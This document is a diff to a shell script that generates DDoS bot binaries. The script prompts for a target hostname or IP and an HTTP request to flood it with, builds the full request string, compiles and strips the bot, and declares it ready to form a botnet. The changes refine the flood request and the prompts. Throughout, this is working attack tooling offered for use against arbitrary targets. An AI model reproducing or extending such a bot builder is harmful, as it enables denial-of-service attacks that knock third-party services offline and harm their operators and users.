@@ -1,7 +1,7 @@
 # In this version, DDOS Bots For Linux Are Available For x86 Architectures Only.
 source ../ui/colors
 cat ../ui/banner
-sleep 4
+
 os(){
 	printf "[${yellow}in${white}] Linux or Windows ? -> "
 	read OS
@@ -59,12 +59,15 @@ bot(){
 	printf "[${yellow}IN$white] Enter Hostname Or IP Address To Which The Attack Will Be Launched -> "
 	read target
 	TAR="#define TARGET "'"'"$target"'"'""
-
+	echo
+	printf "[${yellow}TI$white] The Full Legit HTTP Request is Automatically Set, Do not re-enter it with PUT, GET, POST..."
 	printf "[${yellow}IN$white] Enter HTTP Request That Will Be Used to flood $target (Default is: GET /) -> "
 	read get
-	GET="#define GET "'"'"$get"'"'""
+	GET="#define GET "'"'"$get HTTP/1.1\\\\r\\\\nHost: $target\\\\r\\\\nContent-Type: text/plain\\\\r\\\\nConnection: closed\\\\r\\\\n\\\\r\\\\n"'"'""
 
-	printf "[${yellow}IN$white] Enter Wait time on second for every encountered error while the DDOS Attack (Default is: 5) -> "
+	printf "[${green}DE$white]Full Request: \n$GET"
+
+	printf "[${yellow}IN$white] Enter Wait time in seconds for every encountered error in the Bot Workflow (Default is: 5) -> "
 	read onerror
 	ONERROR="#define ON_ERROR $onerror"
 
@@ -80,10 +83,10 @@ produce(){
 
 os
 attack
-sleep 1
+
 bot
 produce
 rm "${fn}.ev.cpp"
 strip "$fn"
 echo
-printf "\n$blue[+]$white Bot '$fn' Successfully Stripped, $fn is Ready To Form A Botnet, (As I Said, In This version There is No Command And Control Infrastructure for Produced Bots)"
+printf "\n$blue[+]$white Bot '$fn' Successfully Stripped, $fn is Ready To Form A Botnet, (As I Said, In This version There is No Command And Control Infrastructure for Produced Bots)\n"
